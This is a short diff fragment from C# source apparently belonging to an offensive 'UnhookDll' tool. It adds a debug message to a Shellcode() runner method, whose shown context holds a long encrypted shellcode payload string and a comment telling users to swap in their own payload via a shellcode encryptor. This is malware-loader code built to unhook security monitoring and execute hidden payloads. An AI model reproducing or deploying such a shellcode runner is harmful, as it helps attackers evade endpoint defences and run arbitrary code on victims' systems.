@@ -63,6 +63,8 @@ namespace UnhookDll
 
         static void Shellcode()
         {
+            Debug("\n[+] Shellcode runner...");
+            
             // the encrypted payload and key - change this to your needs
             // see https://github.com/plackyhacker/ShellcodeEncryptor
             string payload = "4kRNv6IYTes83XyHrCb/7dnd+fRPCfQRof4miLBaIs3lpoqYLkkPsKGErvKXp1ohlnTJWyEFiO17HK2DzamT7SE+ELAVuJAUiExwwMHhkPIUBOQ/2pg8PkIaB3n/cEVp3E8S+xvz58bqFsbZ5SDQwIFw5hyBxgXy4HMxLCx39JplCGMKMVWmLX2I14+lS89Ep+/AyXFsm2jaggPkTxwOM/f+Fn+/IuYJ7mIguqaQ9ldgMnIrmGS2nIyyCfKTXKQrdFYDahu6YFw5D/WdJEWOD5x4xTf8aWDiIHQ6HRt79onHJSxclr+ud5aSdCyZvZbgpkzoHEjRbWtU+cBdycRAIUygQxAd/nVhJZUIK93Tizd07N3N006mFI9SCH6urbcQGKGpI916NbkhTidMxsc9I3QY0OikT/lmeHNqsZ+QaIz4RXvME5KRboTeb1ZmF5aj9xDISERCnymL4qots4uBYMO+RWP5weOhCXNPiOQ6JXcOASrUC3rUAM9qi4s0iyVdOBXZGfeItIClIXnsc1jGZQeJ9iFIHLmYIRLje4K+J3YKqOSNOBXxC4bhsb5sDe7b04vUPQ/wYQsrHMJpI/2m3wq9R4zp7+20bqYHSCTKJIeIySe4BzDgi+DtGtJDo/Jn5G+h05McYm6M1Dmw6tR9N+O8aAFr+bJsDqD124mwpeP6ApxePPsfIT6xYPaSqQLUR7VkiV8rOys3VvHEzixnMOqQsa9i9tHlqUe+THGTJARNcIwgKoesQlvLQp7WVjgSdnAuK5ougrBZzuRRE6rPiWiP3PfFJri/Cmp4wFWH+xfPxLcUBg6SmFdDRvWWj0OFSCMqMG6n3dsWycBYoWiDB6bqNqSNdKvUAPWDRCimM3tPqpl21als+ZedWaC00COznjOsQyO7rPiu+G/QMfMLI0pgOWodDUye+bp3l8X/qb6YymUWMclTethXMkWaGP77uhQ3tixeB6zIkzWSq8v+IPy10bTUH/MKr2BdE5SXShIQP+GRefIOQtu9f+Q1WVX+";
